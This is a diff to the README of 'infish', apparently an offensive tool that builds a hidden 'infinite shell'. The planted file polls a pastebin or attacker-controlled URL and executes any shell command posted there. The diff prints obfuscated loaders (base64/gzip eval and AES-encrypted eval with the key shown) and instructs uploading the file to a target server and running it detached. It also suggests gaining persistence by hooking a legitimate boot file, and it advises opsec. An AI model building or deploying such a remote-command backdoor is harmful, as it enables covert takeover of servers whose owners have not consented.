@@ -13,15 +13,26 @@ Anytime you need to run a command, simply edit the paste to the command you want
 
 # Usage
 
+
+As usual, to see usage,
+
+```bash
+$ ./infish -h
+```
+or
+```bash
+$ ./infish --help
+```
+
 There are two ways to build the final product.
 
-- Using a raw paste url (or a website you control. Observe opsec though.)
+- Using a raw pastebin url (or a url from a website you control. Observe opsec though.)
 - Using your pastebin dev api key, username, and password
 
 However, you first need to clone this repository or copy the infis-builder file to your local machine. Make it executable by running  
 
 ```bash
-$ chmod +x infish-builder
+$ chmod +x infish
 ```
 
 ## Using a raw url
@@ -29,21 +40,34 @@ $ chmod +x infish-builder
 This is when you already have a webpage (observe opsec) or have already created a paste by hand. Get the **raw paste url** or the url or the page and run the following command
 
 ```bash
-$ ./infish-builder url pastebin.com/raw/abc123
+$ ./infish --url 'https://example.com/cmd' --sleep 900 --user-agent 'Mozilla 5.0'
 ```
 **or**
 
 ```bash
-$ ./infish-builder url somesite.com/cmdpage
+$ ./infish --key 'ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890' --sleep 900 --user-agent 'Mozilla 5.0'
 ```
-**You can also use this is you have a url you host on the internet**.
 
 This will generate a file called **.infish** with contents that look like  
 
 ```bash
 #!/usr/bin/env bash
-eval "$(echo 'H4sIAAAAAAAAA3VQUUvDMBB+76+4hTJaoW06daClD1PRFxVBYQ/Dh9heXTBNRtpuY+J/N0ntZA89wiV33/cl+a7qZNFyJaEQZRDCN5jwbFrBBCIE4qcE3mE6BY1tp2X2D5aj4Iludcos+mKgEv9leUdgko9eRvxANOCn4YDWcAaRrkbxXu2M/HheNRisGZfWoZN1DWr2ibLNyZM6cCFYchlTCJZclmrXwPMbpDSmGZjG/CKDvU16e53SeUxDeMDiSyUzmlKzUrjnGiu1TxxK+ge0yMmGNS1+cBkXqk402yWLm9t0dt4zTK9mssz9oDBkiJpXiB4hWoB//Jw5ahE6Nq/sIA/G7Z/OuM2gXaN0sI3euCtRNHjs45YJGGSuW3HP7Y1A3MAVpXZQuzUXCK3uMINSOdyOzCuVRO8XMv8NvicCAAA=' | base64 -d | gunzip -c)";
+decrypted=$(printf "%s" "2zvhB+0qO2zqAoEinkUcDPSr6M9XnvlFyQ+9dusb6R9BthEkH1k7eHwJpl+qJSda
+Q7S2w1ijyWn6rJeDlyhsC9pjwFgopvKe5A0KWD7PGoycRjQdPwGqFkAtS/AQrRDz
+zBJuD6WOtr/Is5k1Fkk8ytnFazILqQlJalJRWv80lfW82WKJLfIKdtLw0ukbkyZ7
+NYYIjy7ixdH6GmHpQAtglwqU/IyakMgFKI3K4y4lyqbgYdPjvKg/z6W3OCTtfmP8
+AiDmuy7iuvBsmXlg9+pvgUeutDi1e2H9CKTVKviFFB57EeEdBSaOx2ha/fuXjCmU
+U6WXKe8X3MS3ZpUBgc13mxgSCkMmSt0djyADDaS78EgccggdZyHJaMVIbb4cem1S
+Ab/6gTfJiRnlS8RPT7MrBGz1xXs6pxYFqrOJnDURY4i34iUEtqQwuBDndkztLRfK
+XtdEbTf27uXj900xOcLmBfGcJDLCnEqzdI1oWCVZq6NNE+NxrLEOqVB668/HMeBG
+Ubqv/Klau2aBPr75Q4r13g1GAkkTE32eveecXe8vEFYlwz6wok2R43idQIOBJ2/c
+/4Mq1LrLoBylbsZcIPOTThHIMHpr91Rk32mpa8rFSR+YVMhGGPSZr6Jq7n9CmhtW
+8j3MWGdTIfH0iWVgmUJ7TcKJwWr4LA8h9oSNJyavqDTlgCzKdv9uLUWwyG6LmFkX
+J6uGY9kX+lYnsrwLWHwz+lwiN3qTCc1o7Uw68sEeZbg=" | openssl enc -aes-256-cbc -K "950749b504f82fdd3899e5de21681724b596c2587c2457bf683f686e65a9f45c" -iv "853e8f9b15046491fe4a3067fa60bc8b" -d -a);
+eval "$decrypted";
 ```
+
+**You can specify the output filename or path using the `-o` or `--output` option**.
 
 ## Using your pastebin details
 
@@ -56,7 +80,7 @@ This is the recommended method, as everything is automated. For this, obtain the
 Then run the following
 
 ```bash
-$ ./infish-builder key xxxxxxxxxxxxxxxxxxxxxxx
+$ ./infish key xxxxxxxxxxxxxxxxxxxxxxx
 Pastebin username:
 john
 Pastebin password:
@@ -69,14 +93,29 @@ Successfully built infinite shell
 $
 ```
 
-A file called '.infish' is created. It will contain something like this   
+A file called '.infish' is created. 
+
+Again, the file will contain something like  
 
 ```bash
 #!/usr/bin/env bash
-eval "$(echo 'H4sIAAAAAAAAA3VQUUvDMBB+76+4hTJaoW06daClD1PRFxVBYQ/Dh9heXTBNRtpuY+J/N0ntZA89wiV33/cl+a7qZNFyJaEQZRDCN5jwbFrBBCIE4qcE3mE6BY1tp2X2D5aj4Iludcos+mKgEv9leUdgko9eRvxANOCn4YDWcAaRrkbxXu2M/HheNRisGZfWoZN1DWr2ibLNyZM6cCFYchlTCJZclmrXwPMbpDSmGZjG/CKDvU16e53SeUxDeMDiSyUzmlKzUrjnGiu1TxxK+ge0yMmGNS1+cBkXqk402yWLm9t0dt4zTK9mssz9oDBkiJpXiB4hWoB//Jw5ahE6Nq/sIA/G7Z/OuM2gXaN0sI3euCtRNHjs45YJGGSuW3HP7Y1A3MAVpXZQuzUXCK3uMINSOdyOzCuVRO8XMv8NvicCAAA=' | base64 -d | gunzip -c)";
+decrypted=$(printf "%s" "2zvhB+0qO2zqAoEinkUcDPSr6M9XnvlFyQ+9dusb6R9BthEkH1k7eHwJpl+qJSda
+Q7S2w1ijyWn6rJeDlyhsC9pjwFgopvKe5A0KWD7PGoycRjQdPwGqFkAtS/AQrRDz
+zBJuD6WOtr/Is5k1Fkk8ytnFazILqQlJalJRWv80lfW82WKJLfIKdtLw0ukbkyZ7
+NYYIjy7ixdH6GmHpQAtglwqU/IyakMgFKI3K4y4lyqbgYdPjvKg/z6W3OCTtfmP8
+AiDmuy7iuvBsmXlg9+pvgUeutDi1e2H9CKTVKviFFB57EeEdBSaOx2ha/fuXjCmU
+U6WXKe8X3MS3ZpUBgc13mxgSCkMmSt0djyADDaS78EgccggdZyHJaMVIbb4cem1S
+Ab/6gTfJiRnlS8RPT7MrBGz1xXs6pxYFqrOJnDURY4i34iUEtqQwuBDndkztLRfK
+XtdEbTf27uXj900xOcLmBfGcJDLCnEqzdI1oWCVZq6NNE+NxrLEOqVB668/HMeBG
+Ubqv/Klau2aBPr75Q4r13g1GAkkTE32eveecXe8vEFYlwz6wok2R43idQIOBJ2/c
+/4Mq1LrLoBylbsZcIPOTThHIMHpr91Rk32mpa8rFSR+YVMhGGPSZr6Jq7n9CmhtW
+8j3MWGdTIfH0iWVgmUJ7TcKJwWr4LA8h9oSNJyavqDTlgCzKdv9uLUWwyG6LmFkX
+J6uGY9kX+lYnsrwLWHwz+lwiN3qTCc1o7Uw68sEeZbg=" | openssl enc -aes-256-cbc -K "950749b504f82fdd3899e5de21681724b596c2587c2457bf683f686e65a9f45c" -iv "853e8f9b15046491fe4a3067fa60bc8b" -d -a);
+eval "$decrypted";
 ```
+**You can specify the output filename or path using the `-o` or `--output` option**.
 
-Finally, upload the **.infish** file to the target server and there, make it executable by running   
+Finally, upload the **.infish** file to the target server and then, make it executable by running   
 
 ```bash
 $ chmod +x .infish
@@ -90,11 +129,4 @@ $ nohup ./.infish & disown
 
 Now, you can edit your paste to any shell command and the server will run it.
 
-That's it, you own the server. If you have root access, you can set the last command to run on boot.
-
-If you're confused or have no idea what's going on on this page, then you should not be here. Go build cute websites and apps.
-
-
-
-
-Stay Dangerous :)
+That's it, you own the server. If you have root access, you can set the last command above to run on boot or attach it to a legitimate file that runs on boot. Figure that part out.
